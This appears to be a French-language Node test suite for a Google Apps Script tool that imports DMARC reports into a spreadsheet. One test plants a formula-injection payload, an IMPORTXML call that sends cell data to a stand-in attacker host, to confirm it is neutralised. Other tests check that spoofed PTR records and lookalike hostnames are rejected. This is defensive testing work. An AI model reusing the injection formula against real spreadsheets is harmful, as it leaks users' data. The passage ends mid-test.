/**
 * Rapports DMARC — banc d'essai.
 *
 *     node banc/test.js
 *
 * Les `.gs` sont chargés dans un contexte Node où les services Google sont
 * simulés (`banc/faux-google.js`), puis rejoués sur des rapports de la forme
 * que rendent les vrais émetteurs.
 *
 * **Chaque défaut corrigé a ici le cas qui l'aurait attrapé** ; le test en
 * porte la mention « défaut v0 » (le script d'origine, sans numéro).
 *
 * Piège du procédé : les `const` de portée globale ne deviennent pas des
 * propriétés de l'objet global — on les récupère par `vm.runInContext`.
 */

'use strict';

const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const { construireSandbox, blobXml, blobGzip, blobZip, FauxMessage, Formule } = require('./faux-google');

const RACINE = path.join(__dirname, '..');
const SOURCES = RACINE;

/* --------------------------------------------------------------------------
 * Chargement
 * ----------------------------------------------------------------------- */

/**
 * Charge le projet dans un contexte neuf, fichiers dans l'ordre alphabétique de l'éditeur.
 *
 * Par défaut, le classeur a déjà un onglet Domaines portant une adresse de
 * réception, comme une installation configurée ; sans domaine listé, donc sans
 * filtrage. `adresses: null` laisse le classeur vierge.
 */
const chargerProjet = (options = {}) => {
    const { adresses = ['dmarc@example.net'], ...autres } = options;
    const contexte = construireSandbox(autres);
    if (adresses) {
        const sh = contexte.classeur.insertSheet('Domaines');
        sh.getRange(1, 1, 1, 3).setValues([['domaine', 'adresse_rua', 'commentaire']]);
        if (adresses.length) sh.getRange(2, 1, adresses.length, 3).setValues(adresses.map(a => ['', a, 'banc']));
    }
    vm.createContext(contexte.sandbox);
    fs.readdirSync(SOURCES).filter(n => n.endsWith('.gs')).sort().forEach((nom) => {
        vm.runInContext(fs.readFileSync(path.join(SOURCES, nom), 'utf8'), contexte.sandbox, { filename: nom });
    });
    contexte.lire = nom => vm.runInContext(nom, contexte.sandbox);
    contexte.traiter = () => vm.runInContext('traiterRapportsDmarc()', contexte.sandbox);
    return contexte;
};

/* --------------------------------------------------------------------------
 * Données
 * ----------------------------------------------------------------------- */

const rapportXml = ({
    id = 'rapport-1', org = 'google.com', domaine = 'example.net', ns = true, pct = '100',
    enregistrements = [['203.0.113.5', 12, 'pass', 'pass'], ['198.51.100.7', 3, 'fail', 'fail']]
} = {}) => `<?xml version="1.0" encoding="UTF-8"?>
<feedback${ns ? ' xmlns="urn:ietf:params:xml:ns:dmarc-2.0"' : ''}>
  <report_metadata>
    <org_name>${org}</org_name>
    <email>noreply-dmarc-support@google.com</email>
    <report_id>${id}</report_id>
    <date_range><begin>1789430400</begin><end>1789516799</end></date_range>
  </report_metadata>
  <policy_published>
    <domain>${domaine}</domain><adkim>r</adkim><aspf>r</aspf><p>none</p><sp>none</sp><pct>${pct}</pct>
  </policy_published>
  ${enregistrements.map(([ip, n, dkim, spf]) => `<record>
    <row>
      <source_ip>${ip}</source_ip><count>${n}</count>
      <policy_evaluated><disposition>none</disposition><dkim>${dkim}</dkim><spf>${spf}</spf></policy_evaluated>
    </row>
    <identifiers><header_from>${domaine}</header_from><envelope_from>${domaine}</envelope_from></identifiers>
    <auth_results>
      <dkim><domain>${domaine}</domain><result>${dkim}</result></dkim>
      <dkim><domain>mailer.example</domain><result>pass</result></dkim>
      <spf><domain>${domaine}</domain><result>${spf}</result></spf>
    </auth_results>
  </record>`).join('\n')}
</feedback>`;

const message = (...pieces) => new FauxMessage('Report domain: example.net', pieces);

/* --------------------------------------------------------------------------
 * Cas
 * ----------------------------------------------------------------------- */

const cas = [];
const test = (nom, fn) => cas.push([nom, fn]);

test('le projet se charge en entier, sans collision de nom global', () => {
    const p = chargerProjet();
    ['onOpen', 'traiterRapportsDmarc', 'creerTableauDeBord', 'aProposDmarc'].forEach(nom =>
        assert.strictEqual(typeof p.lire(nom), 'function', nom));
});

test('VERSION_DMARC vaut le fichier VERSION', () => {
    const attendu = fs.readFileSync(path.join(RACINE, 'VERSION'), 'utf8').trim();
    assert.strictEqual(chargerProjet().lire('VERSION_DMARC'), attendu);
});

test('les cibles du menu et du déclencheur sont des fonctions déclarées', () => {
    const code = fs.readdirSync(SOURCES).filter(n => n.endsWith('.gs'))
        .map(n => fs.readFileSync(path.join(SOURCES, n), 'utf8')).join('\n');
    const cibles = [...code.matchAll(/\.addItem\([^,]+,\s*'(\w+)'\)/g)].map(m => m[1])
        .concat([...code.matchAll(/newTrigger\('(\w+)'\)/g)].map(m => m[1]));
    assert.ok(cibles.length >= 6, 'le contrôle ne voit plus les cibles du menu');
    cibles.forEach(c => assert.match(code, new RegExp(`^function ${c}\\(`, 'm'), c));
});

test('parserRapport_ lit un rapport avec et sans espace de noms', () => {
    const p = chargerProjet();
    const parser = p.lire('parserRapport_');
    [true, false].forEach((ns) => {
        const { rapport, enregistrements } = parser(rapportXml({ ns }));
        assert.strictEqual(rapport[0], 'rapport-1');
        // Objet du contexte vm : autre royaume, donc pas d'instanceof avec le Date de Node.
        assert.strictEqual(Object.prototype.toString.call(rapport[3]), '[object Date]');
        assert.strictEqual(rapport[10], 100, 'pct doit rester numérique');
        assert.strictEqual(enregistrements.length, 2);
        assert.deepStrictEqual([...enregistrements[0].slice(0, 5)], ['203.0.113.5', 12, 'none', 'pass', 'pass']);
        assert.strictEqual(enregistrements[0][7], 'example.net, mailer.example');
    });
});

test('parserRapport_ refuse un rapport sans report_id', () => {
    const parser = chargerProjet().lire('parserRapport_');
    assert.throws(() => parser(rapportXml({ id: '' })), /report_id introuvable/);
});

test('un fil complet : lignes écrites, XML archivé, fil à la corbeille', () => {
    const p = chargerProjet();
    const fil = p.gmail.ajouterFil(message(blobZip('google.com!example.net.zip',
        [['google.com!example.net.xml', rapportXml()]])));
    const bilan = p.traiter();
    assert.ok(fil.corbeille);
    assert.match(bilan, /Nouveaux rapports : 1/);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 1);
    assert.strictEqual(p.classeur.getSheetByName('Enregistrements').lignes().length, 2);
    assert.deepStrictEqual(p.dossier.fichiers, ['google.com!example.net.xml']);
});

test('défaut v0 : un report_id numérique de 20 chiffres survit à Sheets et reste reconnu', () => {
    const p = chargerProjet();
    const id = '10326483716373626337';
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ id }))));
    p.traiter();
    const lu = p.classeur.getSheetByName('Rapports').lignes()[0][0];
    assert.strictEqual(lu, id, `Sheets a converti le report_id en ${lu}`);
    assert.strictEqual(p.classeur.getSheetByName('Enregistrements').lignes()[0][0], id);

    // Même rapport renvoyé par l'émetteur : il doit être vu comme un doublon.
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ id }))));
    const bilan = p.traiter();
    assert.match(bilan, /Doublons ignorés : 1/);
    assert.ok(fil.corbeille);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 1);
});

test('défaut v0 : deux report_id qui ne diffèrent qu\'au-delà du 15e chiffre restent deux clés distinctes', () => {
    // Stockés en nombres, ils devenaient tous deux 1,0326483716373627E+19 : le
    // VLOOKUP du tableau de bord prêtait alors au second la date et l'émetteur du premier.
    const p = chargerProjet();
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ id: '10326483716373626337' }))));
    p.gmail.ajouterFil(message(blobXml('b.xml', rapportXml({ id: '10326483716373626338' }))));
    p.traiter();
    const cles = p.classeur.getSheetByName('Rapports').lignes().map(l => l[0]);
    assert.strictEqual(new Set(cles).size, 2, `clés relues : ${cles.join(', ')}`);
});

test('défaut v0 : un champ du rapport commençant par = n\'est pas écrit comme formule', () => {
    const p = chargerProjet();
    const piege = '=IMPORTXML("https://attaquant.example/?"&A1,"//a")';
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml({ org: piege.replace(/&/g, '&amp;').replace(/"/g, '&quot;') }))));
    p.traiter();
    const cellules = p.classeur.getSheetByName('Rapports').lignes()[0];
    assert.ok(!cellules.some(v => v instanceof Formule), 'une formule a été injectée');
});

test('défaut v0 : une pièce .gz sans nom ne fait pas planter l\'extraction', () => {
    const p = chargerProjet();
    const fil = p.gmail.ajouterFil(message(blobGzip(null, rapportXml())));
    p.traiter();
    assert.ok(fil.corbeille, 'le fil aurait dû être traité');
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes()[0][11], 'rapport.xml');
});

test('défaut v0 : une pièce .docx n\'est pas prise pour du XML', () => {
    const extraire = chargerProjet().lire('extraireXml_');
    const docx = blobXml('note.docx', 'PK…',
        'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
    assert.strictEqual(extraire(docx).length, 0);
});

test('un fil sans rapport reçoit le libellé d\'erreur et n\'est pas supprimé', () => {
    const p = chargerProjet();
    const fil = p.gmail.ajouterFil(message());
    const bilan = p.traiter();
    assert.ok(!fil.corbeille);
    assert.deepStrictEqual(fil.libelles, ['DMARC-Erreur']);
    assert.match(bilan, /retirez le libellé/);
});

test('défaut v0 : une panne Drive n\'empêche pas le rapport d\'être enregistré à la relance', () => {
    const p = chargerProjet();
    p.dossier.enPanne = true;
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    p.traiter();
    assert.deepStrictEqual(fil.libelles, ['DMARC-Erreur']);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 0);

    // L'administrateur retire le libellé, Drive est revenu.
    p.dossier.enPanne = false;
    fil.libelles = [];
    const bilan = p.traiter();
    assert.match(bilan, /Nouveaux rapports : 1/);
    assert.deepStrictEqual(p.dossier.fichiers, ['a.xml']);
    assert.ok(fil.corbeille);
});

test('défaut v0 : plus de 50 fils en attente sont tous traités dans la même exécution', () => {
    const p = chargerProjet();
    for (let i = 0; i < 120; i += 1) {
        p.gmail.ajouterFil(message(blobXml(`r${i}.xml`, rapportXml({ id: `r-${i}` }))));
    }
    assert.match(p.traiter(), /Fils traités : 120/);
    assert.ok(p.gmail.fils.every(f => f.corbeille));
});

test('un index de recherche en retard ne fait pas tourner la boucle à vide', () => {
    const p = chargerProjet();
    for (let i = 0; i < 50; i += 1) {
        p.gmail.ajouterFil(message(blobXml(`r${i}.xml`, rapportXml({ id: `r-${i}` }))));
    }
    p.gmail.indexEnRetard = true;
    assert.match(p.traiter(), /Fils traités : 50/);
    assert.strictEqual(p.gmail.recherches.length, 2);
});

test('le budget de temps interrompt proprement et le dit', () => {
    const p = chargerProjet();
    vm.runInContext('(() => { let t = 0; Date.now = () => (t += 60 * 1000); })()', p.sandbox);
    for (let i = 0; i < 10; i += 1) {
        p.gmail.ajouterFil(message(blobXml(`r${i}.xml`, rapportXml({ id: `r-${i}` }))));
    }
    const bilan = p.traiter();
    assert.match(bilan, /Budget de temps atteint/);
    const traites = p.gmail.fils.filter(f => f.corbeille).length;
    assert.ok(traites > 0 && traites < 10, `${traites} fils traités`);
});

test('un compte autre que le compte technique ne touche à rien', () => {
    const p = chargerProjet({ email: 'quelquun@example.com' });
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    assert.strictEqual(p.traiter(), 'Compte non autorisé.');
    assert.ok(!fil.corbeille);
    assert.strictEqual(p.gmail.recherches.length, 0);
});

test('un verrou occupé rend null sans rien traiter', () => {
    const p = chargerProjet();
    p.verrou.libre = false;
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    assert.strictEqual(p.traiter(), null);
    assert.strictEqual(p.gmail.recherches.length, 0);
});

test('aucune suppression définitive dans le projet et sendEmail restreint aux alertes', () => {
    const code = fs.readdirSync(SOURCES).filter(n => n.endsWith('.gs'))
        .map(n => fs.readFileSync(path.join(SOURCES, n), 'utf8')).join('\n');
    assert.doesNotMatch(code, /\.(remove|delete)\s*\(|GmailApp\.sendEmail|deleteMessage|setTrashed/);
    const appelsSend = [...code.matchAll(/(\w+)\.sendEmail\s*\(/g)].map(m => m[1]);
    assert.ok(appelsSend.every(obj => obj === 'MailApp'), 'seul MailApp est autorisé pour les alertes de sécurité');
});

test('archivage Drive désactivé si aucune propriété ScriptProperties n\'est définie', () => {
    const p = chargerProjet({ proprietesScript: {} });
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    const bilan = p.traiter();
    assert.ok(fil.corbeille);
    assert.strictEqual(p.dossier.fichiers.length, 0, 'aucun fichier ne doit être créé sur Drive');
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 1);
});

test('défaut v1.1.0 : dossier Drive configuré mais inaccessible — rien n\'est mis à la corbeille', () => {
    const p = chargerProjet({ proprietesScript: { DRIVE_FOLDER_ID: 'dossier-supprime' } });
    const fil = p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    assert.throws(() => p.traiter(), /Aucun fil n'a été traité[\s\S]*Configurer le dossier/);
    assert.ok(!fil.corbeille, 'le fil est parti à la corbeille sans archive');
    assert.strictEqual(p.gmail.recherches.length, 0);
});

test('défaut v1.1.0 : l\'état de l\'archivage figure dans le bilan', () => {
    const sans = chargerProjet({ proprietesScript: {} });
    sans.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    assert.match(sans.traiter(), /Archivage Drive : DÉSACTIVÉ/);

    const avec = chargerProjet();
    avec.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())));
    assert.match(avec.traiter(), /Archivage Drive : actif \(dossier « Archives DMARC »\)/);
});

test('défaut v1.1.0 : un fil mixte livre ses bons rapports, une seule fois', () => {
    const p = chargerProjet();
    const fil = p.gmail.ajouterFil(message(
        blobXml('bon.xml', rapportXml({ id: 'bon-1' })),
        blobXml('casse.xml', '<pas du xml')));
    p.traiter();
    assert.deepStrictEqual(fil.libelles, ['DMARC-Erreur'], 'le fil doit rester à vérifier');
    assert.ok(!fil.corbeille);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 1);
    assert.strictEqual(p.classeur.getSheetByName('Enregistrements').lignes().length, 2);

    // L'administrateur retire le libellé ; la pièce fautive est toujours là.
    fil.libelles = [];
    const bilan = p.traiter();
    assert.match(bilan, /Doublons ignorés : 1/);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 1);
    assert.strictEqual(p.dossier.fichiers.length, 1, 'l\'archive Drive a été dupliquée');
});

test('défaut v1.1.0 : le même rapport en deux exemplaires dans un fil n\'est écrit qu\'une fois', () => {
    const p = chargerProjet();
    p.gmail.ajouterFil(message(blobXml('a.xml', rapportXml())), message(blobXml('a.xml', rapportXml())));
    assert.match(p.traiter(), /Doublons ignorés : 1/);
    assert.strictEqual(p.classeur.getSheetByName('Rapports').lignes().length, 1);
});

test('défaut v1.1.0 : les clés de configuration citées par DEMARRAGE.md existent', () => {
    const p = chargerProjet();
    const config = p.lire('CONFIG_DMARC');
    const texte = fs.readFileSync(path.join(RACINE, 'DEMARRAGE.md'), 'utf8');
    const section = texte.slice(texte.indexOf('Dans `DmarcConfig.gs`'));
    const cles = [...section.slice(0, section.indexOf('\n## ')).matchAll(/^\| `(\w+)` \|/gm)].map(m => m[1]);
    // Depuis la v1.4.0, seul COMPTE_TECHNIQUE reste dans le code.
    assert.ok(cles.length >= 1, 'le contrôle ne voit plus le tableau de configuration');
    cles.forEach(c => assert.ok(c in config, `DEMARRAGE.md cite ${c}, absent de CONFIG_DMARC`));
});

test('défaut v1.1.0 : aucun caractère invisible dans les sources', () => {
    // Un BOM ou une espace de largeur nulle dans une expression régulière ne se
    // voit pas à la relecture, et disparaît au premier copier-coller.
    fs.readdirSync(SOURCES).filter(n => n.endsWith('.gs')).forEach((nom) => {
        const code = fs.readFileSync(path.join(SOURCES, nom), 'utf8');
        const m = /[﻿​-‍⁠­]/.exec(code);
        assert.ok(!m, `${nom} : U+${m && m[0].charCodeAt(0).toString(16).toUpperCase().padStart(4, '0')} `
            + `à la position ${m && m.index}`);
    });
});

test('une date invalide dans date_range ne produit pas d\'objet Invalid Date', () => {
    const p = chargerProjet();
    const parser = p.lire('parserRapport_');
    const xml = '<?xml version="1.0" encoding="UTF-8"?>\n'
        + '<feedback>\n'
        + '  <report_metadata>\n'
        + '    <org_name>test.org</org_name>\n'
        + '    <email>test@test.org</email>\n'
        + '    <report_id>bad-date-1</report_id>\n'
        + '    <date_range><begin>abc</begin><end>-50</end></date_range>\n'
        + '  </report_metadata>\n'
        + '  <policy_published><domain>test.org</domain></policy_published>\n'
        + '</feedback>';
    const { rapport } = parser(xml);
    assert.strictEqual(rapport[3], '');
    assert.strictEqual(rapport[4], '');
});

test('creerTableauDeBord est refusé pour un compte non technique', () => {
    const p = chargerProjet({ email: 'autre@domaine.com', adresses: null });
    p.lire('creerTableauDeBord()');
    assert.strictEqual(p.classeur.feuilles.size, 0, 'aucun onglet ne doit être créé');
});

/* --------------------------------------------------------------------------
 * v1.2.0 — aides
 * ----------------------------------------------------------------------- */

const UN_JOUR = 24 * 60 * 60 * 1000;

/** Minuit UTC du jour J-n : c'est là que commence la période d'un rapport réel. */
const minuitUtc = (n, maintenant = Date.now()) => {
    const d = new Date(maintenant - n * UN_JOUR);
    return new Date(Date.UTC(d.getUTCFullYear(), d.getUTCMonth(), d.getUTCDate()));
};

/**
 * Pose dans le faux classeur un rapport tel que le traitement l'écrit :
 * période = la journée d'hier (UTC) par défaut, reçu il y a `recuIlYa` ms.
 */
const poserRapport = (p, { id, org = 'google.com', domaine = 'domaine-test.fr', joursAvant = 1,
    recuIlYa = 60 * 60 * 1000, enregistrements = [] }) => {
    const rap = p.classeur.getSheetByName('Rapports') || p.classeur.insertSheet('Rapports');
    const enr = p.classeur.getSheetByName('Enregistrements') || p.classeur.insertSheet('Enregistrements');
    const entetesR = [...p.lire('ENTETES_RAPPORTS')];
    const entetesE = [...p.lire('ENTETES_ENREG')];
    if (!rap.getLastRow()) rap.getRange(1, 1, 1, entetesR.length).setValues([entetesR]);
    if (!enr.getLastRow()) enr.getRange(1, 1, 1, entetesE.length).setValues([entetesE]);
    const cle = p.lire('cleRapport_')(org, id);
    const debut = minuitUtc(joursAvant);
    const fin = new Date(debut.getTime() + UN_JOUR - 1000);
    rap.getRange(rap.getLastRow() + 1, 1, 1, entetesR.length).setValues([[`'${id}`, org, `x@${org}`, debut, fin,
        domaine, 'r', 'r', 'none', 'none', 100, `${id}.xml`, new Date(Date.now() - recuIlYa), `'${cle}`]]);
    enregistrements.forEach(([ip, n, dispo, dkim, spf]) => {
        enr.getRange(enr.getLastRow() + 1, 1, 1, entetesE.length).setValues([[`'${id}`, domaine, ip, n, dispo, dkim, spf,
            domaine, domaine, '', '', '', '', `'${cle}`, '']]);
    });
};

const parametresDefaut = p => {
    const r = {};
    p.lire('PARAMETRES_DMARC').forEach(x => { r[x.cle] = x.defaut; });
    return r;
};

/* --------------------------------------------------------------------------
 * v1.2.0 — noms d'hôte
 * ----------------------------------------------------------------------- */

test('v1.2.0 : nom PTR des IPv4 et IPv6', () => {
    const inverser = chargerProjet().lire('inverserIpPourPtr_');
    assert.strictEqual(inverser('1.2.3.4'), '4.3.2.1.in-addr.arpa');
    assert.strictEqual(inverser('2001:db8::25'),
        '5.2.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.8.b.d.0.1.0.0.2.ip6.arpa');
    ['invalide', '1.2.3', '300.1.1.1', '2001:db8::1::2', '::ffff:1.2.3.4'].forEach(ip =>
        assert.strictEqual(inverser(ip), null, ip));
});

test('défaut v1.2.0 : un opérateur n\'est reconnu que sur une frontière de label', () => {
    const identifier = chargerProjet().lire('identifierOperateur_');
    assert.strictEqual(identifier('mail-ej1.google.com'), 'Google (Gmail, Workspace)');
    assert.strictEqual(identifier('outbound.protection.outlook.com'), 'Microsoft (Outlook, 365)');
    ['evil-outlook.com', 'notgoogle.com', 'mail.google.com.attaquant.example', 'serveur.inconnu.fr']
        .forEach(h => assert.strictEqual(identifier(h), '', h));
});

test('défaut v1.2.0 : un PTR usurpé n\'est pas attribué à l\'opérateur qu\'il imite', () => {
    const resoudre = chargerProjet().lire('resoudreIp_');
    const vrai = resoudre('1.2.3.4');
    assert.strictEqual(vrai.statut, 'confirme');
    assert.strictEqual(vrai.operateur, 'Google (Gmail, Workspace)');

    // 6.6.6.6 se dit mail.google.com, mais mail.google.com ne résout pas vers 6.6.6.6.
    const faux = resoudre('6.6.6.6');
    assert.strictEqual(faux.statut, 'non_confirme');
    assert.strictEqual(faux.operateur, '');

    assert.strictEqual(resoudre('2001:db8::25').statut, 'confirme');
    assert.strictEqual(resoudre('9.9.9.9').statut, 'absent');
});

test('défaut v1.2.0 : une panne DNS n\'est ni affichée comme « pas de PTR » ni mise en cache', () => {
    const p = chargerProjet();
    const tdb = p.classeur.insertSheet('Tableau de bord');
    tdb.getRange(47, 3, 3, 1).setValues([['1.2.3.4'], ['6.6.6.6'], ['9.9.9.9']]);

    p.reseau.dnsEnPanne = true;
    assert.strictEqual(p.lire('enrichirTopSourcesNonConformes_(SpreadsheetApp.getActiveSpreadsheet())'), 0);
    assert.strictEqual(p.classeur.getSheetByName('_CacheIP'), null, 'une panne a été mise en cache');

    p.reseau.dnsEnPanne = false;
    assert.strictEqual(p.lire('enrichirTopSourcesNonConformes_(SpreadsheetApp.getActiveSpreadsheet())'), 3);
    const cache = p.classeur.getSheetByName('_CacheIP').lignes();
    const affichage = new Map(cache.map(l => [l[0], l[1]]));
    assert.match(affichage.get('1.2.3.4'), /^Google .* — mail-ej1\.google\.com$/);
    assert.match(affichage.get('6.6.6.6'), /^NON VÉRIFIÉ/);
    assert.match(affichage.get('9.9.9.9'), /pas de PTR/);

    // Relance : tout est en cache, aucune requête, et pas de doublon dans l'onglet.
    const avant = p.requetesHttp.length;
    p.lire('enrichirTopSourcesNonConformes_(SpreadsheetApp.getActiveSpreadsheet())');
    assert.strictEqual(p.requetesHttp.length, avant);
    assert.strictEqual(p.classeur.getSheetByName('_CacheIP').lignes().length, 3);
});

/* --------------------------------------------------------------------------
 * v1.2.0 — alertes
 * ----------------------------------------------------------------------- */

const detecter = (p, parametres = parametresDefaut(p)) => {
    p.sandbox.parametresTest = parametres;
    return p.lire('detecterAnomalies_(SpreadsheetApp.getActiveSpreadsheet(), parametresTest)');
};
const alerter = (p, parametres = parametresDefaut(p)) => {
    p.sandbox.parametresTest = parametres;
    return p.lire('envoyerAlertesSiNecessaire_(SpreadsheetApp.getActiveSpreadsheet(), parametresTest)');
};

test('défaut v1.2.0 : un rapport réel — période d\'hier, reçu ce matin — déclenche l\'alerte', () => {
    // La 1.2.0 filtrait sur date_debut : minuit UTC d'hier est presque toujours
    // plus vieux que 24 h, et ce rapport était écarté.
    const p = chargerProjet();
    poserRapport(p, { id: 'hier', joursAvant: 1, recuIlYa: 2 * 60 * 60 * 1000,
        enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    const anomalies = detecter(p);
    assert.strictEqual(anomalies.length, 1);
    assert.strictEqual(anomalies[0].type, 'CONFORMITE_BASSE');
});

test('un rapport reçu il y a plus de 24 h ne déclenche plus d\'alerte, et le volume minimal compte', () => {
    const p = chargerProjet();
    poserRapport(p, { id: 'vieux', joursAvant: 3, recuIlYa: 30 * 60 * 60 * 1000,
        enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    poserRapport(p, { id: 'maigre', domaine: 'petit.fr',
        enregistrements: [['198.51.100.2', 3, 'none', 'fail', 'fail']] });
    assert.strictEqual(detecter(p).length, 0);
});

test('la détection relit Enregistrements depuis le bas, sans parcourir tout l\'onglet', () => {
    const p = chargerProjet();
    for (let i = 0; i < 30; i += 1) {
        poserRapport(p, { id: `ancien-${i}`, joursAvant: 10, recuIlYa: 9 * UN_JOUR,
            enregistrements: Array.from({ length: 200 }, () => ['203.0.113.9', 1, 'none', 'pass', 'pass']) });
    }
    poserRapport(p, { id: 'recent', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    const enr = p.classeur.getSheetByName('Enregistrements');
    const lectures = [];
    const getRange = enr.getRange.bind(enr);
    enr.getRange = (l, c, h, w) => { lectures.push(h); return getRange(l, c, h, w); };
    assert.strictEqual(detecter(p).length, 1);
    const lues = lectures.reduce((a, b) => a + b, 0);
    // Un bloc qui contient les récentes, un bloc sans elles, puis arrêt.
    const bloc = p.lire('BLOC_LECTURE_ALERTES');
    assert.ok(lues <= 2 * bloc && lues < 6001, `${lues} lignes lues sur 6 001`);
});

test('défaut v1.2.0 : un envoi raté n\'arme pas le délai de 24 h, et le bilan le dit', () => {
    const portees = JSON.parse(fs.readFileSync(path.join(RACINE, 'appsscript.json'), 'utf8')).oauthScopes
        .filter(x => !x.endsWith('script.send_mail'));
    const p = chargerProjet({ portees });
    poserRapport(p, { id: 'hier', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    const r = alerter(p);
    assert.strictEqual(r.canaux.length, 0);
    assert.match(r.echecs[0], /script\.send_mail/);
    assert.strictEqual(Object.keys(p.scriptProps.getProperties()).filter(k => k.startsWith('ALERTE_')).length, 0,
        'le délai a été armé alors que rien n\'est parti');

    // Au passage suivant, avec la portée, l'alerte part.
    const q = chargerProjet({ proprietesScript: p.scriptProps.getProperties() });
    poserRapport(q, { id: 'hier', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    assert.strictEqual(alerter(q).canaux.length, 1);
    assert.strictEqual(alerter(q), null, 'le délai de 24 h doit bloquer le renvoi');
    assert.strictEqual(q.emailsEnvoyes.length, 1);
});

test('défaut v1.2.0 : le manifeste déclare la portée de chaque service utilisé', () => {
    const code = fs.readdirSync(SOURCES).filter(n => n.endsWith('.gs'))
        .map(n => fs.readFileSync(path.join(SOURCES, n), 'utf8')).join('\n');
    const portees = JSON.parse(fs.readFileSync(path.join(RACINE, 'appsscript.json'), 'utf8')).oauthScopes;
    const requises = [
        [/\bMailApp\./, 'script.send_mail'], [/\bUrlFetchApp\./, 'script.external_request'],
        [/\bGmailApp\./, 'mail.google.com'], [/\bDriveApp\./, 'auth/drive'],
        [/\bScriptApp\.newTrigger/, 'script.scriptapp'], [/\.getUi\(\)/, 'script.container.ui']
    ];
    requises.forEach(([service, portee]) => {
        if (service.test(code)) assert.ok(portees.some(x => x.includes(portee)), `portée ${portee} absente`);
    });
});

test('défaut v1.2.0 : webhook — Discord reçoit « content », un refus HTTP est un échec', () => {
    const p = chargerProjet({ proprietesScript: { WEBHOOK_ALERTE: 'https://discord.com/api/webhooks/1/abc' } });
    poserRapport(p, { id: 'hier', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    const r = alerter(p);
    assert.deepStrictEqual([...r.canaux].sort(), ['courriel à dmarc-bot@example.com', 'webhook'].sort());
    const corps = JSON.parse(p.requetesHttp.find(x => x.url.includes('discord')).options.payload);
    assert.ok(typeof corps.content === 'string' && !('text' in corps));

    const q = chargerProjet({ proprietesScript: { WEBHOOK_ALERTE: 'https://chat.googleapis.com/v1/spaces/x' } });
    q.reseau.codeWebhook = 500;
    poserRapport(q, { id: 'hier', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    const r2 = alerter(q);
    assert.match(r2.echecs.join(), /HTTP 500/);
    assert.ok(JSON.parse(q.requetesHttp.find(x => x.url.includes('chat')).options.payload).text);

    const z = chargerProjet({ proprietesScript: { WEBHOOK_ALERTE: 'http://exemple.fr/hook' } });
    poserRapport(z, { id: 'hier', enregistrements: [['198.51.100.1', 20, 'none', 'fail', 'fail']] });
    assert.match(alerter(z).echecs.join(), /HTTPS obligatoire/);
    assert.ok(!z.requetesHttp.some(x => x.url.startsWith('http://')));
});

test('le libellé d\'alerte parle de rejets, pas d\'usurpation', () => {
    const p = chargerProjet();
    poserRapport(p, { id: 'hier', enregistrements: [['198.51.100.1', 80, 'reject', 'fail', 'fail']] });
    alerter(p);
    assert.match(p.emailsEnvoyes[0].body, /pic de rejets/);
    assert.doesNotMatch(p.emailsEnvoyes[0].body, /usurpation/i);
});

test('budget de temps épuisé : ni résolution DNS ni alerte, et le bilan le dit', () => {
    const p = chargerProjet();
    vm.runInContext('(() => { let t = 0; Date.now = () => (t += 60 * 1000); })()', p.sandbox);
    for (let i = 0; i < 10; i += 1) {
        p.gmail.ajouterFil(message(blobXml(`r${i}.xml`, rapportXml({ id: `r-${i}` }))));
    }
    const bilan = p.traiter();
    assert.match(bilan, /reportés au prochain passage/);
    assert.strictEqual(p.requetesHttp.length, 0);
    assert.strictEqual(p.emailsEnvoyes.length, 0);
});

/* --------------------------------------------------------------------------
 * v1.2.0 — paramètres
 * ----------------------------------------------------------------------- */

test('Paramètres : onglet créé avec les défauts, valeur humaine jamais réécrite', () => {
    const p = chargerProjet();
    const lire = () => p.lire('lireParametres_(SpreadsheetApp.getActiveSpreadsheet())');
    const premier = lire();
    assert.strictEqual(premier.valeurs.JOURS_RETENTION, 180);
    assert.strictEqual(premier.avertissements.length, 0);

    const sh = p.classeur.getSheetByName('Paramètres');
    const ligne = sh.lignes().findIndex(l => l[0] === 'JOURS_RETENTION') + 2;
    sh.getRange(ligne, 2).setValues([[365]]);
    const second = lire();
    assert.strictEqual(second.valeurs.JOURS_RETENTION, 365);
    assert.strictEqual(sh.lignes().filter(l => l[0]).length, p.lire('PARAMETRES_DMARC').length, 'clé dupliquée');
});

test('Paramètres : une valeur invalide applique le défaut et le dit, sans rien réécrire', () => {
    const p = chargerProjet();
    p.lire('lireParametres_(SpreadsheetApp.getActiveSpreadsheet())');
    const sh = p.classeur.getSheetByName('Paramètres');
    const ligne = sh.lignes().findIndex(l => l[0] === 'JOURS_RETENTION') + 2;
    sh.getRange(ligne, 2).setValues([[7]]); // sous le minimum de 30 jours
    const { valeurs, avertissements } = p.lire('lireParametres_(SpreadsheetApp.getActiveSpreadsheet())');
    assert.strictEqual(valeurs.JOURS_RETENTION, 180);
    assert.match(avertissements.join(), /JOURS_RETENTION invalide/);
